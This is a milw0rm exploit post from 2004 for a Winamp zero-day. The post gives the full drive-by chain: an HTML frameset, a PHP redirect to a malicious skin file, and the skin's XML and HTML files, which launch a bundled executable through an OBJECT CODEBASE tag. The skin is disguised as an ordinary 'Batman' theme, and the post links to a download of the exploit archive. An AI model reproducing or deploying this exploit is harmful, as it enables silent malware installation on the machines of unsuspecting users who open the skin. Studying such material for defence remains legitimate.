This 0day exploit is known to be circulating in the wild

There is no patch for this vulnerability -> Do not use Winamp !

http://www.milw0rm.com/sploits/skinhead.rar (171 Ko)


index.html
-----------
<html>
<head>
</head>
<frameset rows="*,1" framespacing="0" border="0" frameborder="NO">
<frame src="load.php" name="frame_content" scrolling="auto" noresize>
</frameset>
<noframes>
<body>
</body>
</noframes>
</html>


Load.php
---------
<?php
$httpref = $HTTP_REFERER;
header("Location: http://URL/foo.wsz");
?> 


foo.wsz (foo.zip)
-----------------
/frame/
/maki/
/shade/
/html/
/html/file.exe (malicious file to execute)
/html/test.htm (html to load the .exe)
/player/
/player/Thumbs.db
/xml/
/xml/includes.xml
/xml/player-normal.xml
/xml/player.xml
/skin.xml


/html/test.htm
----------------
<html>
<OBJECT NAME='X' CLASSID='CLSID:11111111-1111-1111-1111-111111111123' CODEBASE='file.exe'>
</html>


/xml/includes.xml
-------------------
<include file="player.xml"/>


/xml/player-normal.xml
-------------------------
<layout>
<browser id="browser" x="0" y="0" w="0" h="0" relatw="1" relath="1" url="file:///@SKINPATH@html/test.htm" />
</layout>


/xml/player.xml
-----------------
<container id="main" name="main">
<include file="player-normal.xml"/>
</container>


/skin.xml
---------
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

<WinampAbstractionLayer version="1.1">
<skininfo>
<version>1.0</version>
<name>Batman</name>
<comment></comment>
<author>Petrol Designs</author>
<email>info@petroldesigns.com</email>
<homepage>http://www.petroldesigns.com</homepage>
</skininfo>

<include file="xml/includes.xml"/>
<!-- 
-->
</WinampAbstractionLayer>

// milw0rm.com [2004-08-25]
